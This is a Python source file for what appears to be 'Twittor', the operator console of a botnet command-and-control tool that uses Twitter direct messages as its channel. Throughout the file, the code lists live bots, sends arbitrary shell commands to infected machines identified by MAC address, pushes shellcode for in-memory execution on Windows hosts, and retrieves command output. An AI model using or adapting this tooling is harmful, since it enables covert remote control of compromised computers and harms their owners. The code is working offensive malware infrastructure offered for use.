import tweepy
import base64
import json
import random
import string
import time
import sys

CONSUMER_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
CONSUMER_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

ACCESS_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
ACCESS_TOKEN_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

USERNAME = 'XXXXXXXXXXXXXXXXXXXXXXXX'
BOTS_ALIVE = []
COMMANDS = []

api = None

#
# Exception for Twittor
#


class TwittorException(Exception):
    """
        Base exception
    """

    def __init__(self, message, errors):
        Exception.__init__(self, message)
        self.errors = errors


class DecodingException(TwittorException):
    """
        Exception when trying to decode a CommandOutput
    """

#
# Class to build Command to send
#


class CommandOutput:

    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.output = data['output']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except:
            raise DecodingException('Error decoding message: %s' % message)

    def get_jobid(self):
        return self.jobid

    def get_sender(self):
        return self.sender

    def get_receiver(self):
        return self.receiver

    def get_cmd(self):
        return self.cmd

    def get_output(self):
        return self.output

#
# Class to send commands
#


class CommandToSend:
    def __init__(self, sender, receiver, cmd):
        self.sender = sender
        self.receiver = receiver
        self.cmd = cmd
        self.jobid = ''.join(random.sample(string.ascii_letters + string.digits, 7))

    def build(self):
        cmd = {'sender': self.sender,
                'receiver': self.receiver,
                'cmd': self.cmd,
                'jobid': self.jobid}
        return base64.b64encode(json.dumps(cmd))

    def get_jobid(self):
        return self.jobid


def refresh(refresh_bots=True):
    global BOTS_ALIVE
    global COMMANDS

    if refresh_bots:
        BOTS_ALIVE = []

        print '[+] Sending command to retrieve alive bots'
        cmd = CommandToSend('master', 'w00tw00tw00t', 'PING')
        jobid = cmd.get_jobid()
        api.send_direct_message(user=USERNAME, text=cmd.build())

        print '[+] Sleeping 10 secs to wait for bots'
        time.sleep(10)

    for message in api.direct_messages(count=200, full_text="true"):
        if (message.sender_screen_name == USERNAME):
            try:
                message = CommandOutput(message.text)
                if refresh_bots and message.get_jobid() == jobid:
                    BOTS_ALIVE.append(message)
                else:
                    COMMANDS.append(message)
            except:
                pass
    if refresh_bots:
        list_bots()


def list_bots():
    if (len(BOTS_ALIVE) == 0):
        print "[-] No bots alive"
        return

    for bot in BOTS_ALIVE:
        print "%s: %s" % (bot.get_sender(), bot.get_output())


def list_commands():
    if (len(COMMANDS) == 0):
        print "[-] No commands loaded"
        return

    for command in COMMANDS:
        print "%s: '%s' on %s" % (command.get_jobid(), command.get_cmd(), command.get_sender())


def retrieve_command(id_command):
    # retrieve command ouputs but don't refresh bot list
    refresh(False)
    for command in COMMANDS:
        if (command.get_jobid() == id_command):
            print "%s: %s" % (command.get_jobid(), command.get_output())
            return
    print "[-] Did not manage to retrieve the output"


def help():
    print """
    refresh - refresh C&C control
    list_bots - list active bots
    list_commands - list executed commands
    !retrieve <jobid> - retrieve jobid command
    !cmd <MAC ADDRESS> command - execute the command on the bot
    !shellcode <MAC ADDRESS> shellcode - load and execute shellcode in memory (Windows only)
    help - print this usage
    exit - exit the client
    """


def main():
    global api

    auth = tweepy.OAuthHandler(CONSUMER_TOKEN, CONSUMER_SECRET)
    auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)

    # Construct the API instance
    api = tweepy.API(auth)

    refresh()
    while True:
        cmd_to_launch = raw_input('$ ')
        if (cmd_to_launch == 'refresh'):
            refresh()
        elif (cmd_to_launch == 'list_bots'):
            list_bots()
        elif (cmd_to_launch == 'list_commands'):
            list_commands()
        elif (cmd_to_launch == 'help'):
            help()
        elif (cmd_to_launch == 'exit'):
            sys.exit(0)
        else:
            cmd_to_launch = cmd_to_launch.split(' ')
            if (cmd_to_launch[0] == "!cmd"):
                cmd = CommandToSend('master', cmd_to_launch[1], ' '.join(cmd_to_launch[2:]))
                api.send_direct_message(user=USERNAME, text=cmd.build())
                print '[+] Sent command "%s" with jobid: %s' % (' '.join(cmd_to_launch[2:]), cmd.get_jobid())
            elif (cmd_to_launch[0] == "!shellcode"):
                cmd = CommandToSend('master', cmd_to_launch[1], 'shellcode %s' % base64.b64encode(cmd_to_launch[2]))
                api.send_direct_message(user=USERNAME, text=cmd.build())
                print '[+] Sent shellcode with jobid: %s' % (cmd.get_jobid())
            elif (cmd_to_launch[0] == "!retrieve"):
                retrieve_command(cmd_to_launch[1])
            else:
                print "[!] Unrecognized command"

if __name__ == '__main__':
    main()
